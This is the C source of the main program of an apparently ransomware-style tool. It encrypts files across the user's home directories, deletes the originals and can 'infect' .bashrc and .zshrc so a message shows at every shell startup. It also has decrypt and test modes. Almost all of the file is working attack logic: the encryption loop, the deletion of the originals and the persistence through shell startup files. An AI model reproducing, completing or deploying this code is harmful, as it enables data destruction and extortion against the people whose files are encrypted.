/*
Copyright 2017 EinBaum

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <getopt.h>
#include <linux/limits.h>

#include "baumcommon.h"
#include "baumhelper.h"
#include "baumcrypt.h"

#include "settings.h"
#include "infect.h"

char test_mode = 0;

const char *rc_files[] = {".bashrc", ".zshrc", NULL};

void help(void) {
	printf("%s - %s\n\n", PROGRAM_NAME, PROGRAM_DESC);
	printf("Usage example:\n");
	printf("%s [(-h|--help)] [(-v|--verbose)] [(-V|--version)]"
		"[(-e|--encrypt) keyfile] [(-d|--decrypt) keyfile]"
		"[(-p|--print)] [(-i|--infect)]\n\n", PROGRAM_NAME);
	printf("Options:\n");
	printf("-h or --help: Displays this information.\n");
	printf("-V or --version: Displays the current version number.\n");
	printf("-v or --verbose: Verbose mode on.\n");
	printf("-t or --test: Do not delete or alter files.\n");
	printf("-e or --encrypt keyfile: Encrypt user home and save key file.\n");
	printf("-d or --decrypt keyfile: Decrypt user home using a key file.\n");
	printf("-p or --print: Display information (default).\n");
	printf("-i or --infect: Make -p information appear on startup.\n");
}

void version(void) {
	printf("%s\n", PROGRAM_NAME);
}

int print_info(void) {
	printf("\n\n%s\n\n", PRINT_INFO);
	return 0;
}

int encrypt_file(const char* name, void *key) {
	int helper_ret = 0;

	size_t name_strlen = strlen(name);
	size_t ext_strlen = strlen(EXTENSION);

	if (name_strlen + ext_strlen >= PATH_MAX) {
		printf_v("name would be longer than PATH_MAX");
		return 1;
	}

	if (name_strlen >= ext_strlen) {
		size_t orig_len = name_strlen - ext_strlen;
		const char *file_ext = name + orig_len;
		if (memcmp(file_ext, EXTENSION, ext_strlen) == 0) {
			printf_v("already encrypted");
			return 1;
		}
	}

	char name_new[PATH_MAX];
	memcpy(name_new, name, name_strlen);
	memcpy(name_new + name_strlen, EXTENSION, ext_strlen + 1);

	printf_v("encrypting: '%s' into '%s'", name, name_new);

	helper_ret = baumcrypt_encrypt(name, name_new, key);
	if (helper_ret != 0) {
		printf_v("encryption failed");
		return 1;
	}

	if (!test_mode) {
		helper_ret = unlink(name);
		if (helper_ret != 0) {
			printf_v("unlink failed");
		} else {
			printf_v("deleted '%s'", name);
		}
	}

	return 0;
}
int baum_encrypt(const char *keyfile) {
	int ret = 0;
	int helper_ret = 0;

	printf_v("Encrypting and writing keyfile to '%s'", keyfile);

	unsigned char key[BAUMCRYPT_KEYLEN];
	helper_ret = baumcrypt_makekey(key);
	if (helper_ret != 0) {
		return 1;
	}

	helper_ret = helper_putfile(keyfile, BAUMCRYPT_KEYLEN, key);
	if (helper_ret != 0) {
		return 1;
	}

	helper_ret = helper_chdir_home();
	if (helper_ret != 0) {
		return 1;
	}

	for (int i = 0 ; DIRECTORIES[i] != NULL ; i++) {
		helper_ret = helper_list(DIRECTORIES[i], encrypt_file, key);
		if (helper_ret != 0) { }
	}

	return ret;
}

int decrypt_file(const char* name, void *key) {
	int helper_ret = 0;

	size_t name_strlen = strlen(name);
	size_t ext_strlen = strlen(EXTENSION);

	if (name_strlen >= PATH_MAX) {
		printf_v("name longer than PATH_MAX");
		return 1;
	}

	if (name_strlen < ext_strlen) {
		return 1;
	}

	size_t orig_len = (name_strlen - ext_strlen);
	const char *file_ext = name + orig_len;
	if (memcmp(file_ext, EXTENSION, ext_strlen) != 0) {
		return 1;
	}

	char name_new[PATH_MAX];
	memcpy(name_new, name, orig_len);
	name_new[orig_len] = '\0';

	printf_v("decrypting: '%s' into '%s'", name, name_new);

	helper_ret = baumcrypt_decrypt(name, name_new, key);
	if (helper_ret != 0) {
		printf_v("decryption failed");
		return 1;
	}

	if (!test_mode) {
		helper_ret = unlink(name);
		if (helper_ret != 0) {
			printf_v("unlink failed");
		} else {
			printf_v("deleted '%s'", name);
		}
	}

	return 0;
}
int baum_decrypt(const char *keyfile) {
	int ret = 0;
	int helper_ret = 0;

	printf_v("Decrypting using the keyfile '%s'", keyfile);

	int fd; off_t len; unsigned char *key;
	helper_ret = helper_openfile(keyfile, &fd, &len, (void*)&key);
	if (helper_ret != 0) {
		return 1;
	}

	helper_ret = helper_chdir_home();
	if (helper_ret != 0) {
		ret = 1;
		goto end;
	}

	for (int i = 0 ; DIRECTORIES[i] != NULL ; i++) {
		helper_ret = helper_list(DIRECTORIES[i], decrypt_file, key);
		if (helper_ret != 0) { }
	}

end:
	helper_closefile(fd, len, key);
	return ret;
}

int main(int argc, char **argv) {
	char opt_help = 0;
	char opt_version = 0;
	char opt_encrypt = 0;
	char opt_decrypt = 0;
	char opt_print = 0;
	char opt_infect = 0;
	char opt_uninfect = 0;

	char *opt_encrypt_file = NULL;
	char *opt_decrypt_file = NULL;

	int next_option;
	const char* const short_options = "hVvte:d:piu";
	const struct option long_options[] =
	{
		{ "help",	0, NULL, 'h' },
		{ "version",	0, NULL, 'V' },
		{ "verbose",	0, NULL, 'v' },
		{ "test",	0, NULL, 't' },
		{ "encrypt",	1, NULL, 'e' },
		{ "decrypt",	1, NULL, 'd' },
		{ "print",	0, NULL, 'p' },
		{ "infect",	0, NULL, 'i' },
		{ "uninfect",	0, NULL, 'u' },
		{ NULL, 0, NULL, 0 }
	};

	while (1) {
		next_option = getopt_long(argc, argv,
			short_options, long_options, NULL);

		if (next_option == -1)
			break;

		switch (next_option) {
		case 'h':
			opt_help = 1;
			break;
		case 'V':
			opt_version = 1;
			break;
		case 'v':
			baumcommon_setverbose(1);
			break;
		case 't':
			test_mode = 1;
			break;
		case 'e':
			opt_encrypt = 1;
			opt_encrypt_file = optarg;
			break;
		case 'd':
			opt_decrypt = 1;
			opt_decrypt_file = optarg;
			break;
		case 'p':
			opt_print = 1;
			break;
		case 'i':
			opt_infect = 1;
			break;
		case 'u':
			opt_uninfect = 1;
			break;
		case '?':
			return 1;
		default:
			return 1;
		}
	}

	if (opt_help) {
		help();
		return 0;
	}
	if (opt_version) {
		version();
		return 0;
	}

	int selected = (opt_encrypt + opt_decrypt
		+ opt_print + opt_infect + opt_uninfect);

	if (selected > 1) {
		fprintf(stderr, "Too many options selected.\n");
	} else if (selected == 0) {
		opt_print = 1;
	}

	if (opt_print) {
		return print_info();
	}
	if (opt_infect) {
		return baum_infect(rc_files, test_mode);
	}
	if (opt_uninfect) {
		return baum_uninfect(rc_files, test_mode);
	}
	if (opt_encrypt) {
		return baum_encrypt(opt_encrypt_file);
	}
	if (opt_decrypt) {
		return baum_decrypt(opt_decrypt_file);
	}
}
